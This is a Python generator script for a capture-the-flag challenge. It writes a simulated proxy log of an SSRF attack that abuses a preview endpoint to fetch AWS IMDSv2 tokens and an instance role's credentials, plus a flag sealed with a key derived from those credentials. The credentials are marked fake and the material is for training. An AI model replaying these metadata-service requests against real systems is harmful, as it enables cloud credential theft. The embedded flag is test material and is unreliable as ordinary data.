#!/usr/bin/env python3
"""Deterministic generator for the 'imds-ssrf' challenge.

A proxy captured the HTTP traffic of an SSRF exploit against an EC2 workload:
the attacker used IMDSv2 (PUT a token, then GET with X-aws-ec2-metadata-token)
to read the instance role's temporary credentials. We ship that capture plus an
encrypted operator note that was found on the box; the note is XOR-sealed with a
keystream derived from the role's SecretAccessKey, so parsing the capture
unlocks it.
"""

import base64
import hashlib
import os

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.abspath(os.path.join(HERE, ".."))

FLAG = b"NCTF{imdsv2_creds_decrypted_the_note}"

ROLE = "media-transcoder-role"
AKID = "ASIAQF4KEKELI0FAKE01"
# obviously-fake dev secret access key (not a real AWS secret)
SECRET = "wJalrFAKEdevSECRETkeyEXAMPLEnotREAL0123456"
TOKEN = "IQoJb3JpFAKEdevSESSIONtokenEXAMPLEonly//////////wEXAMPLE=="
IMDS_TOKEN = "AQAEAFAKEimdsv2tokenEXAMPLEonlyNOTreal=="

CAPTURE = f"""\
# SSRF proxy capture -- kekeli media preview service (10.0.4.19)
# The /preview?url= endpoint fetched attacker-supplied URLs server-side.

--- request 1 (attacker -> /preview) ---
GET /preview?url=http://169.254.169.254/latest/api/token HTTP/1.1
Host: preview.kekeli.internal

--- upstream 1 (server -> IMDS) ---
PUT /latest/api/token HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token-ttl-seconds: 21600

HTTP/1.1 200 OK
{IMDS_TOKEN}

--- request 2 (attacker -> /preview) ---
GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: preview.kekeli.internal

--- upstream 2 (server -> IMDS, with token header) ---
GET /latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: {IMDS_TOKEN}

HTTP/1.1 200 OK
{ROLE}

--- request 3 (attacker -> /preview) ---
GET /preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/{ROLE} HTTP/1.1
Host: preview.kekeli.internal

--- upstream 3 (server -> IMDS, with token header) ---
GET /latest/meta-data/iam/security-credentials/{ROLE} HTTP/1.1
Host: 169.254.169.254
X-aws-ec2-metadata-token: {IMDS_TOKEN}

HTTP/1.1 200 OK
{{
  "Code" : "Success",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "{AKID}",
  "SecretAccessKey" : "{SECRET}",
  "Token" : "{TOKEN}",
  "Expiration" : "2026-03-02T15:04:05Z"
}}
"""


def keystream(key: bytes, n: int) -> bytes:
    out = bytearray()
    ctr = 0
    while len(out) < n:
        out += hashlib.sha256(key + ctr.to_bytes(4, "big")).digest()
        ctr += 1
    return bytes(out[:n])


def main() -> None:
    with open(os.path.join(ROOT, "ssrf-capture.log"), "w", encoding="utf-8") as fh:
        fh.write(CAPTURE)

    ks = keystream(hashlib.sha256(SECRET.encode()).digest(), len(FLAG))
    ct = bytes(a ^ b for a, b in zip(FLAG, ks))
    note = (
        "# operator note (found at /home/ubuntu/notes/handoff.enc)\n"
        "# sealed: XOR keystream = SHA256(instance role SecretAccessKey)\n"
        + base64.b64encode(ct).decode()
        + "\n"
    )
    with open(os.path.join(ROOT, "notes.enc"), "w", encoding="utf-8") as fh:
        fh.write(note)
    print("[+] wrote ssrf-capture.log, notes.enc")


if __name__ == "__main__":
    main()
